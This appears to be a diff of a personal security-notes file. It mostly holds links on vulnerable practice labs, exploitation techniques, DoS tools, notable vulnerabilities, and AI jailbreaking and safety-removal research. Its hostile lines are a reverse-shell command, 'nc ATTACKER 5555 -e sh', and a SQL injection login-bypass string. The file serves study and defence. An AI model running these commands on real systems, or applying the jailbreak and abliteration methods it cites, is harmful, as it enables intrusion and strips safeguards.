+[OWASP Vulnerable Web Applications Directory | OWASP Foundation](https://owasp.org/www-project-vulnerable-web-applications-directory/)
+[vavkamil/awesome-vulnerable-apps: Awesome Vulnerable Applications](https://github.com/vavkamil/awesome-vulnerable-apps)
+
+[vulnerable-apps](https://github.com/vulnerable-apps)
+[vulnerable-apps/awesome-vulnerable: A curated list of VULNERABLE APPS and SYSTEMS which can be used as PENETRATION TESTING PRACTICE LAB.](https://github.com/vulnerable-apps/awesome-vulnerable)
+[vulnerable-apps/Vulnerable-JWT: Collection of vulnerable APIs/apps to test JWT attacks](https://github.com/vulnerable-apps/Vulnerable-JWT)
+[vulnerable-apps/vuln_node_express](https://github.com/vulnerable-apps/vuln_node_express)
 
 [trailofbits/not-going-anywhere: A set of vulnerable Golang programs](https://github.com/trailofbits/not-going-anywhere)
 [trailofbits/not-slithering-anywhere: The Python Version of our Not Go-ing Anywhere Vulnerable Application](https://github.com/trailofbits/not-slithering-anywhere)
 
+[Download Metasploitable - Virtual Machine to Test Metasploit](https://www.rapid7.com/products/metasploit/metasploitable/)
+[rapid7/metasploitable3: Metasploitable3 is a VM that is built from the ground up with a large amount of security vulnerabilities.](https://github.com/rapid7/metasploitable3)
+
 [Vulhub - Docker-Compose file for vulnerability environment](https://vulhub.org/)
 [vulhub/vulhub: Pre-Built Vulnerable Environments Based on Docker-Compose](https://github.com/vulhub/vulhub)
 
-[snoopysecurity/dvws: Damn Vulnerable Web Services is an insecure web application with multiple vulnerable web service components that can be used to learn real world web service vulnerabilities. NOTE: This project is out of date, please use https://github.com/snoopysecurity/dvws-node](https://github.com/snoopysecurity/dvws)
+[cider-security-research/cicd-goat: A deliberately vulnerable CI/CD environment. Learn CI/CD security through multiple challenges.](https://github.com/cider-security-research/cicd-goat#Take-the-challenge)
 
 [zhuifengshaonianhanlu/pikachu: 一个好玩的Web安全-漏洞测试平台](https://github.com/zhuifengshaonianhanlu/pikachu)
+
+## Generative AI
+
+[AI and Cybersecurity: The Dual Role of Automation in Threat Mitigation and Attack Facilitation](https://www.itprotoday.com/vulnerabilities-threats/ai-and-cybersecurity-the-dual-role-of-automation-in-threat-mitigation-and-attack-facilitation)
+[Fortifying Your Organization Against AI-Driven Injection Attacks](https://www.itprotoday.com/vulnerabilities-threats/fortifying-your-organization-against-ai-driven-injection-attacks)
+
+[Now Scammers Are Sending Bank-Draining Malware Through Snail Mail: Here's How](https://www.makeuseof.com/scammers-bank-draining-malware-snail-mail/)
+
+[Countdown to GovWare 2023 - The Application of Artificial Intelligence (AI) in Cybersecurity - NSFOCUS, Inc., a global network and cyber security leader, protects enterprises and carriers from advanced cyber attacks.](https://nsfocusglobal.com/countdown-to-govware-2023-the-application-of-artificial-intelligence-ai-in-cybersecurity/#Attack_Preparation)
+
+[CyberNative/CyberBase-13b · Hugging Face](https://huggingface.co/CyberNative/CyberBase-13b)
+
+### Jailbreak
+
+[Universal and Transferable Attacks on Aligned Language Models](https://llm-attacks.org/)
+[[2307.15043] Universal and Transferable Adversarial Attacks on Aligned Language Models](https://arxiv.org/abs/2307.15043)
+[llm-attacks/llm-attacks: Universal and Transferable Attacks on Aligned Language Models](https://github.com/llm-attacks/llm-attacks)
+
+[Aligning language models to follow instructions | OpenAI](https://openai.com/index/instruction-following/)
+[[2204.05862] Training a Helpful and Harmless Assistant with Reinforcement Learning from Human Feedback](https://arxiv.org/abs/2204.05862)
+
+[[2406.11717] Refusal in Language Models Is Mediated by a Single Direction](https://arxiv.org/abs/2406.11717)
+[Refusal in LLMs is mediated by a single direction — LessWrong](https://www.lesswrong.com/posts/jGuXSZgv6qfdhMCuJ/refusal-in-llms-is-mediated-by-a-single-direction)
+
+[[2310.20624] LoRA Fine-tuning Efficiently Undoes Safety Training in Llama 2-Chat 70B](https://arxiv.org/abs/2310.20624)
+
+[Maxime Labonne - Uncensor any LLM with abliteration](https://mlabonne.github.io/blog/posts/2024-06-04_Uncensor_any_LLM_with_abliteration.html)
+
+### CyberPal.AI
+
+[2408.09304v1] CyberPal.AI: Empowering LLMs with Expert-Driven Cybersecurity Instructions
+
+- SecKnowledge, an instruction-tuning dataset
+- CyberPal. AI, a family of cyber-security expert LLMs (Llama3 8B, Mistral 8B, ...)
+- SecKnowledge-Eval, evaluation datasets and public benchmarks
+- improvement of up to 24% in training-aligned tasks and up to 10% in public cyber-security benchmarks
+
+### CyberSecEval
+
+[2404.13161v1] CyberSecEval 2: A Wide-Ranging Cybersecurity Evaluation Suite for Large Language Models
+[CYBERSECEVAL 3: Advancing the Evaluation of Cybersecurity Risks and Capabilities in Large Language Models | Research - AI at Meta](https://ai.meta.com/research/publications/cyberseceval-3-advancing-the-evaluation-of-cybersecurity-risks-and-capabilities-in-large-language-models/)
+
+- benchmark to quantify LLM security
+  risks and capabilities
+- False Refusal Rate (FRR) of prompts
+- LLM's capabilities of exploiting software
+  vulnerabilities
+
+[CyberSecEval 3 | CyberSecEval 3](https://meta-llama.github.io/PurpleLlama/)
+[PurpleLlama/CybersecurityBenchmarks at main · meta-llama/PurpleLlama](https://github.com/meta-llama/PurpleLlama/tree/main/CybersecurityBenchmarks) ❗!important
+[meta-llama/PurpleLlama: Set of tools to assess and improve LLM security.](https://github.com/meta-llama/PurpleLlama)
+
+### Project Naptime
+
+Code scan to discovering vulnerability
+
+[Project Zero: Project Naptime: Evaluating Offensive Security Capabilities of Large Language Models](https://googleprojectzero.blogspot.com/2024/06/project-naptime.html)
+[Project Zero: From Naptime to Big Sleep: Using Large Language Models To Catch Vulnerabilities In Real-World Code](https://googleprojectzero.blogspot.com/2024/10/from-naptime-to-big-sleep.html)
 
 ## Smart Contracts
 
@@ -978,11 +1282,11 @@ Low Level Learning
 
 [[reverse-engineering#debugging]]
 
-[Buffer overflow - Wikiwand](https://omni.wikiwand.com/en/Buffer_overflow)
-[Stack buffer overflow - Wikiwand](https://omni.wikiwand.com/en/Stack_buffer_overflow)
-[Heap overflow - Wikiwand](https://omni.wikiwand.com/en/Heap_overflow)
-[NOP slide - Wikiwand](https://omni.wikiwand.com/en/NOP_slide)
-[Return-to-libc attack - Wikiwand](https://omni.wikiwand.com/en/Return-to-libc_attack)
+[Buffer overflow - Wikiwand](https://www.wikiwand.com/en/Buffer_overflow)
+[Stack buffer overflow - Wikiwand](https://www.wikiwand.com/en/Stack_buffer_overflow)
+[Heap overflow - Wikiwand](https://www.wikiwand.com/en/Heap_overflow)
+[NOP slide - Wikiwand](https://www.wikiwand.com/en/NOP_slide)
+[Return-to-libc attack - Wikiwand](https://www.wikiwand.com/en/Return-to-libc_attack)
 
 [w00w00 on Heap Overflows - Wayback Machine](https://web.archive.org/web/20060831183237/http://www.w00w00.org/files/articles/heaptut.txt)
 [Linux Kernel Module (LKM) Hacking - Wayback Machine](https://web.archive.org/web/20060829060031/http://www.w00w00.org/files/articles/lkmhack.txt)
@@ -998,6 +1302,7 @@ Stack buffer overflow
 - Return Oriented Programming (ROP)
 - stack migration
 
+[Mastering Buffer Overflow Exploits: A Complete Guide for CTF and Penetration Testing! - YouTube](https://www.youtube.com/watch?v=yBS3DrxjyYk)
 [Running a Buffer Overflow Attack - Computerphile - YouTube](https://www.youtube.com/watch?v=1S0aBV-Waeo)
 [how do hackers exploit buffers that are too small? - YouTube](https://www.youtube.com/watch?v=qpyRz5lkRjE)
 [HACKED! How a Buffer Overflow Exploit works, plus Code Red! - YouTube](https://www.youtube.com/watch?v=7YRyFMv-tY8)
@@ -1017,7 +1322,7 @@ John Hammond
 
 ### Return-Oriented Programming (ROP)
 
-[Return-oriented programming - Wikiwand](https://omni.wikiwand.com/en/Return-oriented_programming)
+[Return-oriented programming - Wikiwand](https://www.wikiwand.com/en/Return-oriented_programming)
 
 [What is ROP - CTF Handbook](https://ctf101.org/binary-exploitation/return-oriented-programming/)
 [ROP Chaining: Return Oriented Programming | Red Team Notes](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/rop-chaining-return-oriented-programming)
@@ -1085,6 +1390,7 @@ This gist is that:
 - **always** validate and sanitize user input
 
 [Cheating at video games - YouTube](https://www.youtube.com/playlist?list=PLxV2db94vuXnC5XK83difOZ-7ytl0pJly)
+[Don’t try to sanitize input. Escape output.](https://benhoyt.com/writings/dont-sanitize-do-escape/)
 
 ### Bind/Remote/Reverse shell
 
@@ -1141,13 +1447,20 @@ nc ATTACKER 5555 -e sh
 
 ### SQL injection
 
-[SQL injection - Wikiwand](http://omni.wikiwand.com/en/SQL_injection)
+Simple injection on username field: `ANYNAME OR' 1=1 --`
+
+[SQL injection - Wikiwand](http://www.wikiwand.com/en/SQL_injection)
 [SQL injection techniques - Getting started with SQL injection - YouTube](https://www.youtube.com/watch?v=05SmIqGX4zQ)
 [Step-by-step SQL injection guide to bypassing basic login screen - Mastering SQL injection - YouTube](https://www.youtube.com/watch?v=SJgYdTckMBY)
 [What is SQL Injection? Tutorial & Examples | Web Security Academy](https://portswigger.net/web-security/sql-injection)
 [Web Security Academy - SQL Injection (Long Version) - YouTube](https://www.youtube.com/playlist?list=PLuyTk2_mYISLaZC4fVqDuW_hOk0dd5rlf)
 
+[SQL Injection | OWASP Foundation](https://owasp.org/www-community/attacks/SQL_Injection)
+[Blind SQL Injection | OWASP Foundation](https://owasp.org/www-community/attacks/Blind_SQL_Injection)
+[SQL Injection Prevention - OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
+
 [7 essential SQL Server security tips | InfoWorld](http://www.infoworld.com/article/2953834/database/7-essential-sql-server-security-tips.html#tk.ifw-infsb)
+[bobby-tables.com: A guide to preventing SQL injection in {currlang}](https://bobby-tables.com/java)
 
 [SQL INJECTION — The Coolest Vulnerability | by Dheeraj Deshmukh | Medium](https://dheerajdeshmukh.medium.com/sql-injection-the-coolest-vulnerability-31c12e412d56)
 [Preventing SQL Injection Attacks With Python – Real Python](https://realpython.com/prevent-python-sql-injection/)
@@ -1157,7 +1470,7 @@ nc ATTACKER 5555 -e sh
 [SQL注入漏洞详解-安全客 - 安全资讯平台](https://www.anquanke.com/post/id/235970)
 [What is SQL Injection? Tutorial & Examples | Web Security Academy](https://portswigger.net/web-security/sql-injection)
 
-Simple injection on username field: `ANYNAME OR' 1=1 --`
+[sqlninja - a SQL Server injection & takeover tool](https://sqlninja.sourceforge.net/)
 
 ### NoSQL injection
 
@@ -1226,8 +1539,8 @@ nltest /server:ASPDC02 /domain_trusts
 
 ### DoS/DDoS
 
-[Denial-of-service attack - Wikiwand](https://omni.wikiwand.com/en/Denial-of-service_attacks)
-[SYN flood - Wikiwand](https://omni.wikiwand.com/en/SYN_flood)
+[Denial-of-service attack - Wikiwand](https://www.wikiwand.com/en/Denial-of-service_attacks)
+[SYN flood - Wikiwand](https://www.wikiwand.com/en/SYN_flood)
 [How to Prevent DDoS Attacks: 7 Tried-and-Tested Methods](https://phoenixnap.com/blog/prevent-ddos-attacks)
 [How to Stop a DDoS Attack: 4 Steps to Take Now](https://datadome.co/learning-center/how-to-stop-ddos-attacks/)
 [How to Stop DDoS Attacks: 6 Tips for Fighting DDoS Attacks](https://www.esecurityplanet.com/networks/how-to-stop-ddos-attacks-tips-for-fighting-ddos-attacks/)
@@ -1237,17 +1550,12 @@ nltest /server:ASPDC02 /domain_trusts
 [Identifying and Mitigating DDoS Attacks](https://www.itprotoday.com/vulnerabilities-and-threats/identifying-and-mitigating-ddos-attacks)
 
 [LOIC download | SourceForge.net](https://sourceforge.net/projects/loic/)
-[Low Orbit Ion Cannon - Wikiwand](https://omni.wikiwand.com/en/Low_Orbit_Ion_Cannon)
+[Low Orbit Ion Cannon - Wikiwand](https://www.wikiwand.com/en/Low_Orbit_Ion_Cannon)
 [What is LOIC - Low Orbit Ion Cannon | DDoS Tools | Imperva](https://www.imperva.com/learn/ddos/low-orbit-ion-cannon/)
 
-[Slowloris (computer security) - Wikiwand](<https://omni.wikiwand.com/en/Slowloris_(computer_security)>)
+[Slowloris (computer security) - Wikiwand](<https://www.wikiwand.com/en/Slowloris_(computer_security)>)
 [Slowloris HTTP DoS](https://web.archive.org/web/20090822001255/http://ha.ckers.org/slowloris/)
 [gkbrk/slowloris: Low bandwidth DoS tool. Slowloris rewrite in Python.](https://github.com/gkbrk/slowloris)
-
-## Air Gap attacks
-
-[Home | Air Gap Research Page](https://www.covertchannels.com/)
-[new attack leaks secrets using RAM as a radio - YouTube](https://www.youtube.com/watch?v=ihtAijebU-M)
 
 ## Timing attacks
 
@@ -1258,7 +1566,7 @@ Use time difference in array comparison to brute force the digest byte by byte.
 ## Heartbleed
 
 [Heartbleed Bug](http://heartbleed.com/)
-[Heartbleed - Wikiwand](https://omni.wikiwand.com/en/Heartbleed)
+[Heartbleed - Wikiwand](https://www.wikiwand.com/en/Heartbleed)
 [Heartbleed – Andrew Kennedy](http://akenn.org/blog/Heartbleed/)
 
 [xkcd: Heartbleed Explanation](https://xkcd.com/1354/)
@@ -1270,7 +1578,7 @@ Use time difference in array comparison to brute force the digest byte by byte.
 
 ## Shellshock
 
-[Shellshock (software bug) - Wikiwand](<https://omni.wikiwand.com/en/Shellshock_(software_bug)>)
+[Shellshock (software bug) - Wikiwand](<https://www.wikiwand.com/en/Shellshock_(software_bug)>)
 
 [The Shellshock Bug In About Four Minutes - YouTube](https://www.youtube.com/watch?v=aKShnpOXqn0)
 [Shellshock DIY – Andrew Kennedy](http://akenn.org/blog/shellshock/)
@@ -1282,15 +1590,17 @@ Use time difference in array comparison to brute force the digest byte by byte.
 
 [Cyber Extortion vs. Ransomware: What's the Difference?](https://www.makeuseof.com/cyber-extortion-vs-ransomware-difference/)
 [Linux Ransomware Threats: How Attackers Target Linux Systems](https://www.itprotoday.com/linux-os/linux-ransomware-threats-how-attackers-target-linux-systems) `DarkRadiation`, `RansomEXX`
+[How Do We Build Ransomware Resilience Beyond Just Backups?](https://www.itprotoday.com/disaster-recovery/how-do-we-build-ransomware-resilience-beyond-just-backups-)
 
 ## BREACH
 
 [BREACH ATTACK](http://breachattack.com/)
-[BREACH (security exploit) - Wikiwand](<http://omni.wikiwand.com/en/BREACH_(security_exploit)>)
+[BREACH (security exploit) - Wikiwand](<http://www.wikiwand.com/en/BREACH_(security_exploit)>)
 
 ## Stuxnet
 
-[Stuxnet - Wikiwand](http://omni.wikiwand.com/en/Stuxnet)
+[Stuxnet - Wikiwand](http://www.wikiwand.com/en/Stuxnet)
+[Stuxnet explained: The first known cyberweapon | CSO Online](https://www.csoonline.com/article/562691/stuxnet-explained-the-first-known-cyberweapon.html)
 [Stuxnet: a 3-Parts Series | Curious Minds - Curious Minds Podcast](http://www.cmpod.net/stuxnet-the-malware-that-struck-the-iranian-nuclear-program-pt-1/)
 [Stuxnet: Advanced Persistent Threat - Ran Levi](http://www.cmpod.net/all-transcripts/stuxnet-the-malware-that-struck-the-iranian-nuclear-program-text/)
 [The Most Sophisticated Malware Ever Made (That We Know Of)🎙Darknet Diaries Ep. 29: Stuxnet - YouTube](https://www.youtube.com/watch?v=9DCwyuH29SI)
@@ -1301,7 +1611,7 @@ Use time difference in array comparison to brute force the digest byte by byte.
 
 ## Row Hammering//Drammer/RAMpage
 
-[Row hammer - Wikiwand](https://omni.wikiwand.com/en/Row_hammer)
+[Row hammer - Wikiwand](https://www.wikiwand.com/en/Row_hammer)
 
 [Physical RAM attack can root Android and possibly other devices | InfoWorld](http://www.infoworld.com/article/3134532/security/physical-ram-attack-can-root-android-and-possibly-other-devices.html)
 [Google researchers hack computers using DRAM electrical leaks | Computerworld](http://www.computerworld.com/article/2895898/google-researchers-hack-computers-using-dram-electrical-leaks.html)
@@ -1316,7 +1626,13 @@ Use time difference in array comparison to brute force the digest byte by byte.
 ## Dirty COW
 
 [Dirty COW (CVE-2016-5195)](https://dirtycow.ninja/)
-[Dirty COW - Wikiwand](https://omni.wikiwand.com/en/Dirty_COW)
+[Dirty COW - Wikiwand](https://www.wikiwand.com/en/Dirty_COW)
+
+## RegreSSHion
+
+[OpenSSH 'RegreSSHion' RCE Vulnerability](https://www.varonis.com/blog/openssh-regresshion-rce-vulnerability)
+[xonoxitron/regreSSHion: CVE-2024-6387 (regreSSHion) Exploit (PoC), a vulnerability in OpenSSH's server (sshd) on glibc-based Linux systems.](https://github.com/xonoxitron/regreSSHion/tree/main)
+[xonoxitron/regreSSHion-checker: Quickly identifies servers vulnerable to OpenSSH 'regreSSHion' (CVE-2024-6387).](https://github.com/xonoxitron/regreSSHion-checker)
 
 ## Meltdown and Spectre
 
@@ -1434,6 +1750,7 @@ npm audit
 [Cheat-Sheets — Malware Archaeology](https://www.malwarearchaeology.com/cheat-sheets) logs genereated by malware
 
 [How Hackers Use netsh.exe For Persistence & Code Execution (Sliver C2) - YouTube](https://www.youtube.com/watch?v=lMihdys4jw8)
+[Modern Malware Is Stealthier Than Older Attacks: This Is How It Stays Hidden](https://www.makeuseof.com/how-modern-malware-goes-undetected/)
 
 [The Art Of Malware - Bringing the dead back to life - Malware - 0x00sec - The Home of the Hacker](https://0x00sec.org/t/the-art-of-malware-bringing-the-dead-back-to-life/19599) old malware
 [Analyzing Modern Malware Techniques - Part 1 - Malware - 0x00sec - The Home of the Hacker](https://0x00sec.org/t/analyzing-modern-malware-techniques-part-1/18663)
